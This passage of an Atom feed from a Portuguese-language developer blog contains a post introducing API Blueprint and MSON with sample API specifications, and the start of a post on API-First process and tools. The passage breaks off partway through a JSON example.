<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Klaus Laube - Klaus Peter Laube</title><link href="https://klauslaube.com.br/" rel="alternate"></link><link href="https://klauslaube.com.br/feeds/klaus-peter-laube.atom.xml" rel="self"></link><id>https://klauslaube.com.br/</id><updated>2020-04-05T07:40:00-03:00</updated><subtitle>Python, Django e desenvolvimento Web</subtitle><entry><title>API Blueprint: Markdown é vida!</title><link href="https://klauslaube.com.br/2020/04/05/api-blueprint-markdown-e-vida.html" rel="alternate"></link><published>2020-04-05T07:40:00-03:00</published><updated>2020-04-05T07:40:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-04-05:/2020/04/05/api-blueprint-markdown-e-vida.html</id><summary type="html">&lt;p&gt;Estamos falando sobre escrever especificações de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;
há um bom tempo aqui no &lt;em&gt;blog&lt;/em&gt;. &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/tag/swagger.html" title="Leia mais sobre Swagger"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://klauslaube.com.br/tag/oai.html" title="Leia mais sobre OpenAPI"&gt;&lt;em&gt;OpenAPI Specification&lt;/em&gt;&lt;/a&gt; já foram explorados, e
com os dois últimos encontramos um ecossistema rico com ferramentas extremamente
interessantes.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Há um outro simpático &lt;em&gt;player&lt;/em&gt; no mercado, o &lt;a href="https://apiblueprint.org/" title="Visite a página oficial do projeto"&gt;&lt;em&gt;API Blueprint&lt;/em&gt;&lt;/a&gt;,
e o &lt;em&gt;post&lt;/em&gt; de hoje …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Estamos falando sobre escrever especificações de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;
há um bom tempo aqui no &lt;em&gt;blog&lt;/em&gt;. &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/tag/swagger.html" title="Leia mais sobre Swagger"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://klauslaube.com.br/tag/oai.html" title="Leia mais sobre OpenAPI"&gt;&lt;em&gt;OpenAPI Specification&lt;/em&gt;&lt;/a&gt; já foram explorados, e
com os dois últimos encontramos um ecossistema rico com ferramentas extremamente
interessantes.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Há um outro simpático &lt;em&gt;player&lt;/em&gt; no mercado, o &lt;a href="https://apiblueprint.org/" title="Visite a página oficial do projeto"&gt;&lt;em&gt;API Blueprint&lt;/em&gt;&lt;/a&gt;,
e o &lt;em&gt;post&lt;/em&gt; de hoje é sobre essa prática ferramenta.&lt;/p&gt;
&lt;h2&gt;A menor curva de aprendizado do Oeste&lt;/h2&gt;
&lt;p&gt;Um colega de trabalho, há muito tempo atrás, me apresentou o &lt;em&gt;API Blueprint&lt;/em&gt;. Na
ótica dele, um dos aspectos mais interessantes era a escrita utilizando &lt;em&gt;Markdown&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/westworld-antony-hopkins.jpg" width="740" height="493" title="É um formato para máquinas? É um formato para humanos? Que diferença faz? (tvguide.com)" alt="É um formato para máquinas? É um formato para humanos? Que diferença faz? (tvguide.com)"&gt;&lt;/p&gt;
&lt;p&gt;Sim! É verdade! Claro que utilizando o formato/extensão específico há ganhos
como &lt;em&gt;syntax highlighting&lt;/em&gt;, mas ainda assim é possível escrever a especificação de uma &lt;em&gt;API&lt;/em&gt; somente
com &lt;em&gt;Markdown&lt;/em&gt;, o que torna a leitura do documento mais amigável, e interoperável com ferramentas
como o seu editor de textos, ou o próprio &lt;em&gt;Github&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-blueprint-github-example.png" width="740" height="595" title="Como o documento é apresentado pelo Github" alt="Como o documento é apresentado pelo Github"&gt;&lt;/p&gt;
&lt;p&gt;Para quem já tem um &lt;code&gt;README.md&lt;/code&gt; em seu repositório, ter um &lt;code&gt;api.md&lt;/code&gt; não parece ser
nenhum grande sacrifício. E dependendo do seu público alvo, ter a "documentação final gerada"
pode ser tão simples quanto compartilhar o &lt;em&gt;link&lt;/em&gt; da especificação no &lt;em&gt;Github&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Mas o que é API Blueprint mesmo?&lt;/h2&gt;
&lt;p&gt;A documentação oficial o define da seguinte forma:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) is simple and accessible to everybody involved in the API lifecycle. Its syntax is concise yet expressive. With API Blueprint you can quickly design and prototype APIs to be created or document and test already deployed mission-critical APIs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Assim como os já citados &lt;em&gt;RAML&lt;/em&gt; e &lt;em&gt;Swagger&lt;/em&gt;, o &lt;em&gt;API Blueprint&lt;/em&gt; é uma linguagem de &lt;em&gt;design&lt;/em&gt; utilizada para
descrever &lt;em&gt;APIs&lt;/em&gt;. O seu propósito é o de encorajar o diálogo e colaboração, logo, uma ferramenta
mais que ideal para adoção no seu processo de &lt;em&gt;API-First&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para ter os ganhos que citei anteriormente, o &lt;em&gt;API Blueprint&lt;/em&gt; usa um "melhoramento" do &lt;em&gt;Markdown&lt;/em&gt;
chamado de &lt;em&gt;MSON&lt;/em&gt; (&lt;em&gt;Markdown Syntax for Object Notation&lt;/em&gt;). É com essa notação que utilizamos a síntaxe
do &lt;em&gt;Markdown&lt;/em&gt; para descrever estruturas de dados, heranças e recursos.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/apiaryio/mson/blob/master/MSON%20Specification.md" title="Leia no Github"&gt;Leia a especificação do &lt;em&gt;MSON&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Começando&lt;/h2&gt;
&lt;p&gt;Voltando ao bom e velho exemplo do &lt;a href="https://klauslaube.com.br/2016/05/20/rest-parte-2.html" title="REST: Parte 2"&gt;&lt;em&gt;mini IMDB&lt;/em&gt;&lt;/a&gt;, vamos criar um arquivo &lt;code&gt;api.md&lt;/code&gt;
e pôr a mão na massa.&lt;/p&gt;
&lt;p&gt;Começamos por definir qual versão do &lt;em&gt;API Blueprint&lt;/em&gt; utilizaremos, bem como descrevendo o nome da &lt;em&gt;API&lt;/em&gt; e seu propósito:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FORMAT: A1

# Movies API

This is an API Blueprint example describing a movies API.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;code&gt;#&lt;/code&gt;, no &lt;em&gt;Markdown&lt;/em&gt;, é associado a um "título de nível 1". Ou seja, o &lt;code&gt;# Movies API&lt;/code&gt; se convertido em &lt;em&gt;HTML&lt;/em&gt; produziria um &lt;code&gt;&amp;lt;h1&amp;gt;Movies API&amp;lt;/h1&amp;gt;&lt;/code&gt;.
Nesse caso, o &lt;code&gt;#&lt;/code&gt; produz o título da &lt;em&gt;API&lt;/em&gt;. O &lt;code&gt;#&lt;/code&gt; também é utilizado para agrupar recursos, mas nesse caso, ele necessita da &lt;em&gt;keyword&lt;/em&gt;
&lt;code&gt;Group&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FORMAT: A1

# Movies API

This is an API Blueprint example describing a movies API.

# Group Movies

Resources related to movies in the API.
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Descrevendo recursos&lt;/h2&gt;
&lt;p&gt;O próximo passo é descrever o recurso e seus &lt;em&gt;endpoints&lt;/em&gt;. Começaremos pelo
&lt;em&gt;endpoint&lt;/em&gt; &lt;code&gt;/movies&lt;/code&gt;. Para descrever o recurso, utilizamos o &lt;code&gt;##&lt;/code&gt;, já a ação
é representada através de 3 &lt;em&gt;hashtags&lt;/em&gt; (&lt;code&gt;###&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(...)

## Movie collection [/movies]

### List all Movies [GET]

List movies in reverse order of publication.

+ Response 200 (application/json)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Quando o recurso &lt;code&gt;/movies&lt;/code&gt; receber uma requisição &lt;code&gt;GET&lt;/code&gt;, ele responderá com
o &lt;em&gt;status code&lt;/em&gt; &lt;code&gt;200&lt;/code&gt;, e com o &lt;code&gt;content-type&lt;/code&gt; &lt;code&gt;application/json&lt;/code&gt;. Essa última
parte é descrita através da linha &lt;code&gt;+ Response 200 (application/json)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-blueprint-resource-example.png" width="740" height="486" title="Exemplo de representação do endpoint" alt="Exemplo de representação do endpoint"&gt;&lt;/p&gt;
&lt;p&gt;Podemos também descrever como será o &lt;em&gt;payload&lt;/em&gt; dessa resposta.&lt;/p&gt;
&lt;h2&gt;Descrevendo os dados&lt;/h2&gt;
&lt;p&gt;É possível utilizar &lt;a href="https://json-schema.org/" title="A vocabulary that allows you to annotate and validate JSON documents"&gt;&lt;em&gt;JSON Schema&lt;/em&gt;&lt;/a&gt;
para descrever o &lt;em&gt;payload&lt;/em&gt; de requisições e respostas. Como ilustrado nesse exemplo tirado da documentação oficial:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;### Create a New Question [POST]
You may create your own question using this action. It takes a JSON object
containing a question and a collection of answers in the form of choices.

+ Request (application/json)

    + Body

            {
              &amp;quot;question&amp;quot;: &amp;quot;Favourite language?&amp;quot;
              &amp;quot;choices&amp;quot;: [
                &amp;quot;Swift&amp;quot;,
                &amp;quot;Objective-C&amp;quot;
              ]
            }

    + Schema

            {
              &amp;quot;$schema&amp;quot;: &amp;quot;http://json-schema.org/draft-04/schema#&amp;quot;,
              &amp;quot;type&amp;quot;: &amp;quot;object&amp;quot;,
              &amp;quot;properties&amp;quot;: {
                &amp;quot;question&amp;quot;: {
                  &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;
                },
                &amp;quot;choices&amp;quot;: {
                  &amp;quot;type&amp;quot;: &amp;quot;array&amp;quot;,
                  &amp;quot;items&amp;quot;: {
                    &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;
                  },
                  &amp;quot;minItems&amp;quot;: 2
                }
              }
            }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;JSON Schema&lt;/em&gt; é um vocabulário poderoso para anotar e validar documentos &lt;em&gt;JSON&lt;/em&gt;. No entanto, ele pode "destoar" do resto do seu documento.&lt;/p&gt;
&lt;p&gt;Há uma alternativa utilizando o próprio &lt;em&gt;MSON&lt;/em&gt;. Através da seção &lt;code&gt;## Data structure&lt;/code&gt;, conseguimos algo semelhante com o ilustrado acima.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(...)

## Data structures

### Movie
+ id: 810b43d0-fc0d-4199-8a79-25b471c880bf (string, required)
+ title: Avengers: Endgame (string, required)
+ description (string)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Descrevemos a estrutura &lt;code&gt;Movie&lt;/code&gt;, informando o seu &lt;code&gt;id&lt;/code&gt; (&lt;code&gt;string&lt;/code&gt; e obrigatória),
&lt;code&gt;title&lt;/code&gt; e &lt;code&gt;description&lt;/code&gt;. Note que este último, além de não ser obrigatório, não
possui nenhum exemplo informado (como os dois outro campos).&lt;/p&gt;
&lt;p&gt;Para associar a estrutura acima com a resposta de &lt;code&gt;/movies&lt;/code&gt;, utilizamos
&lt;code&gt;Attributes&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(...)

### List all Movies [GET]

List movies in reverse order of publication.

+ Response 200 (application/json)

    + Attributes (array[Movie])

(...)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com ajuda do tipo &lt;code&gt;array&lt;/code&gt;, descrevemos o &lt;em&gt;payload&lt;/em&gt; da resposta do &lt;em&gt;endpoint&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-blueprint-data-example.png" width="740" height="981" title="Exemplo de representação do payload" alt="Exemplo de representação do payload"&gt;&lt;/p&gt;
&lt;p&gt;No fim das contas, um &lt;em&gt;JSON body&lt;/em&gt; e &lt;em&gt;JSON Schema&lt;/em&gt; é gerado através dos
atributos &lt;em&gt;MSON&lt;/em&gt;. Por isso do bloco &lt;code&gt;Schema&lt;/code&gt;, exibido na imagem acima.&lt;/p&gt;
&lt;p&gt;Visite o &lt;a href="https://apiblueprint.org/documentation/tutorial.html" title="Tutorial com demais verbos"&gt;tutorial do &lt;em&gt;API Blueprint&lt;/em&gt;&lt;/a&gt;
e veja como aplicar a especificação para os demais verbos &lt;em&gt;HTTP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/kplaube/8cb39a98e0a2892412f060ad6c61704b" title="Veja o exemplo completo no Gist"&gt;O exemplo completo pode ser conferido aqui&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As imagens representando a especificação foram extraídas do &lt;em&gt;plugin&lt;/em&gt; &lt;a href="https://marketplace.visualstudio.com/items?itemName=develiteio.api-blueprint-viewer"&gt;&lt;em&gt;API Blueprint Viewer&lt;/em&gt;&lt;/a&gt;, para o &lt;a href="https://klauslaube.com.br/tag/vscode.html" title="LEia mais sobre VS Code"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Na página de &lt;a href="https://apiblueprint.org/tools.html" title="Visite o site oficial do API Blueprint"&gt;&lt;em&gt;Tools&lt;/em&gt; do site oficial&lt;/a&gt; é
possível conhecer as diferentes ferramentas à disposição, que vão desde editores até &lt;em&gt;mock servers&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Nesse quesito, uma das ferramentas que me conquistou foi o &lt;a href="https://github.com/apiaryio/dredd" title="Visite o repositório no Github"&gt;&lt;em&gt;Dredd&lt;/em&gt;&lt;/a&gt;,
que é utilizado para validar especificação, e funciona tanto com o &lt;em&gt;API Blueprint&lt;/em&gt; quanto com o &lt;em&gt;OpenAPI&lt;/em&gt;. Aliás,
&lt;em&gt;OpenAPI&lt;/em&gt;/&lt;em&gt;Swagger&lt;/em&gt; ainda são "campeões" no quesito ferramentas disponíveis.&lt;/p&gt;
&lt;p&gt;Pela característica do &lt;em&gt;Markdown&lt;/em&gt;, e de ser relativamente mais barato de escrever, eu tive a oportunidade de utilizar o &lt;em&gt;API Blueprint&lt;/em&gt;
da seguinte forma:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Propostas de adições, remoções e alterações são escritas através de &lt;em&gt;API Blueprint&lt;/em&gt; e discutidas com os &lt;em&gt;stakeholders&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;A solução é escrita e o contrato é validado através do &lt;em&gt;Dredd&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Mas a especificação pública é gerada através do código-fonte, com o &lt;em&gt;Swagger&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;E a partir dessa especificação é gerada a documentação final e &lt;em&gt;SDKs&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A facilidade de escrita de documentos &lt;em&gt;API Blueprint&lt;/em&gt; faz dele uma ótima opção e um &lt;em&gt;player&lt;/em&gt; mais que interessante
no cenário de &lt;em&gt;specs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;. Um terreno ainda dominado pelo &lt;em&gt;Swagger&lt;/em&gt;...&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="apis"></category><category term="api-first"></category><category term="api-blueprint"></category><category term="mson"></category></entry><entry><title>API-First: Processo e ferramentas</title><link href="https://klauslaube.com.br/2020/03/02/api-first-processo-e-ferramentas.html" rel="alternate"></link><published>2020-03-02T10:15:00-03:00</published><updated>2020-03-02T10:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-03-02:/2020/03/02/api-first-processo-e-ferramentas.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2020/02/21/o-api-first.html" title="O API-First"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; tive a oportunidade de falar
de uma forma mais abrangente sobre o &lt;a href="https://klauslaube.com.br/tag/api-first.html" title="Leia mais sobre API-First"&gt;&lt;em&gt;API-First&lt;/em&gt;&lt;/a&gt;.
O exercício é interessante, uma vez que é possível focar no conceito,
ao invés de ferramentas e processos. Mas o objetivo
desse artigo é cairmos de cabeça em como exercitar a ideia de forma …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2020/02/21/o-api-first.html" title="O API-First"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; tive a oportunidade de falar
de uma forma mais abrangente sobre o &lt;a href="https://klauslaube.com.br/tag/api-first.html" title="Leia mais sobre API-First"&gt;&lt;em&gt;API-First&lt;/em&gt;&lt;/a&gt;.
O exercício é interessante, uma vez que é possível focar no conceito,
ao invés de ferramentas e processos. Mas o objetivo
desse artigo é cairmos de cabeça em como exercitar a ideia de forma prática.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O problema a ser solucionado será explicado mais abaixo, mas antes de cairmos na tentação
de pensar no &lt;em&gt;framework &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;web&lt;/a&gt;&lt;/em&gt;, na modelagem de dados,
em qual servidor de aplicação usar, ou em virtualizar com &lt;a href="https://klauslaube.com.br/tag/docker.html" title="Leia mais sobre Docker"&gt;&lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;
e &lt;em&gt;Kubernetes&lt;/em&gt;, vamos focar primeiro na especificação.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-first-flow.png" width="422" height="296" title="Diferença de fluxos" alt="Diferença de fluxos"&gt;&lt;/p&gt;
&lt;p&gt;Com sorte seremos capazes de produzir uma &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;API&lt;/em&gt;&lt;/a&gt;
que atenda a necessidade dos nossos &lt;em&gt;stakeholders&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;O problema&lt;/h2&gt;
&lt;p&gt;Vamos "reciclar" o problema proposto no &lt;em&gt;post&lt;/em&gt; sobre &lt;a href="https://klauslaube.com.br/2020/02/13/construindo-apis-em-django-com-django-rest-framework.html" title="Construindo APIs em Django com DRF"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;
e construir um "Feedly-clone". Então, partiremos da análise do seguinte requisito funcional:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Eu como usuário,
Quero poder visualizar notícias recentes de websites que me cadastrei,
Para que assim eu fique atualizado sobre assuntos de meu interesse
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com essa &lt;em&gt;user story&lt;/em&gt;, podemos pensar no processo que envolve a prática do &lt;em&gt;API-First&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;O processo&lt;/h2&gt;
&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2020/02/21/o-api-first.html" title="O API-First"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; mencionei alguns passos
que não podem faltar em um contexto de &lt;em&gt;API-First&lt;/em&gt;. &lt;em&gt;Jennifer Riggins&lt;/em&gt;, no &lt;a href="https://www.programmableweb.com/news/how-to-design-great-apis-api-first-design-and-raml/how-to/2015/07/10" title="Leia o artigo na íntegra"&gt;"How to Design Great APIs with Api-First Design"&lt;/a&gt; traz uma visão mais prática sobre como o processo pode ser definido:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Planeje:&lt;/strong&gt; Mesmo antes de começar, decida o propósito do produto e comece a esboçar a &lt;em&gt;API&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Projete e valide:&lt;/strong&gt; Debata o conceito com outros &lt;em&gt;stakeholders&lt;/em&gt; e progrida com o &lt;em&gt;design&lt;/em&gt; da &lt;em&gt;API&lt;/em&gt;. Prove o conceito através de &lt;em&gt;mocks&lt;/em&gt; (mais a seguir) e compreenda como a &lt;em&gt;API&lt;/em&gt; será utilizada;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Oficialize a especificação:&lt;/strong&gt; Construa a especificação de acordo com o planejamento e &lt;em&gt;design&lt;/em&gt;. Gere
  a documentação baseada na &lt;em&gt;spec&lt;/em&gt;, enriqueça o &lt;em&gt;mock&lt;/em&gt; com os casos de uso e faça o &lt;em&gt;release&lt;/em&gt; da mesma;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Teste:&lt;/strong&gt; Teste para garantir que a &lt;em&gt;API&lt;/em&gt; funcione. Teste para garantir que os casos de uso são atendidos.
  Teste para se assegurar que nenhuma nova alteração quebrou o contrato estabelecido. E considere testes automatizados sempre que possível;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Implemente:&lt;/strong&gt; Não apenas você (&lt;em&gt;backend&lt;/em&gt;), é hora de outros &lt;em&gt;stakeholders&lt;/em&gt; (&lt;em&gt;mobile&lt;/em&gt;, por exemplo) fazerem
  parte do processo de concepção. Quanto antes interagirem, mais cedo e (teoricamente) mais fácil será a reação
  à mudança;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Opere e engage:&lt;/strong&gt; Publique-a! Interaja com seus clientes, aprenda com necessidades que ainda precisam ser atendidas,
  e repita o processo. &lt;em&gt;API-First&lt;/em&gt; é tão sobre negócios quanto é sobre tecnologia.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-first-processo.png" width="740" height="133" title="Exemplo de processo com o API-First" alt="Exemplo de processo com o API-First"&gt;&lt;/p&gt;
&lt;p&gt;Vamos esmiuçar de forma prática cada um dos passos acima.&lt;/p&gt;
&lt;h3&gt;Antes de ir: Single source of truth&lt;/h3&gt;
&lt;p&gt;A abordagem adotada nesse &lt;em&gt;post&lt;/em&gt; seguirá valores apresentados no
&lt;a href="https://medium.com/adobetech/three-principles-of-api-first-design-fa6666d9f694 &amp;quot;Leia o artigo na íntegra"&gt;"Three Principles of API First Design"&lt;/a&gt;. Mais especificamente:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Your API comes first, then the implementation&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;E nesse exemplo vamos separar especificação da implementação de forma "concreta". Ou seja, serão dois artefatos
independentes.&lt;/p&gt;
&lt;p&gt;Existem alternativas a esse &lt;em&gt;approach&lt;/em&gt;, por exemplo, o uso do &lt;a href="https://github.com/axnsan12/drf-yasg" title="Yet another Swagger generator"&gt;&lt;em&gt;drf-yasg&lt;/em&gt;&lt;/a&gt;. Esta é uma ferramenta que gera a especificação (&lt;a href="https://klauslaube.com.br/tag/swagger.html" title="Leia mais sobre Swagger"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://klauslaube.com.br/tag/oai.html" title="Leia mais sobre OpenApi"&gt;&lt;em&gt;OpenAPI Spec&lt;/em&gt;&lt;/a&gt;) automaticamente de acordo com
o código fonte do seu projeto &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; (com &lt;em&gt;REST Framework&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Algo deve ser muito claro independente do que optar: Só deve haver uma verdade absoluta; No caso desse artigo,
será a especificação escrita à parte.&lt;/p&gt;
&lt;h2&gt;1: Planeje&lt;/h2&gt;
&lt;p&gt;Vamos usar &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; como padrão de comunicação entre o nosso servidor e os clientes. Portanto, poderemos utilizar &lt;em&gt;Open API Spec&lt;/em&gt;
para especificar a &lt;em&gt;API&lt;/em&gt;. Caso a solução fosse a adoção de outra tecnologia (por exemplo, &lt;em&gt;GraphQL&lt;/em&gt; ou &lt;em&gt;gRPC&lt;/em&gt;), alternativas para o passo de descrição e documentação da interface devem ser aplicadas.&lt;/p&gt;
&lt;p&gt;Além disso, seremos o mais "compliant" possível com o &lt;em&gt;RESTful&lt;/em&gt;, ou seja, seguiremos à risca recomendações
em relação a &lt;em&gt;path&lt;/em&gt;, &lt;em&gt;status codes&lt;/em&gt; e verbos. O versionamento da &lt;em&gt;API&lt;/em&gt; acontecerá via fragmento no &lt;em&gt;path&lt;/em&gt; (ex.: &lt;code&gt;/v1/&lt;/code&gt;),
e a princípio apresentaremos apenas respostas em &lt;em&gt;JSON&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Imaginemos que depois de ponderar com outros &lt;em&gt;stakeholders&lt;/em&gt;, chegamos à seguinte conclusão:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Título do artigo publicado no canal ABC&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pub_date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data-com-timezone-incluso&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;summary&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Resumo do artigo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Conteúdo completo do artigo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;imagem-principal-do-artigo.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;channel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ABC&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://article-1.html&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Título do artigo publicado no canal XYZ&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pub_date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data-com-timezone-incluso&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;summary&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Resumo do artigo (2)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
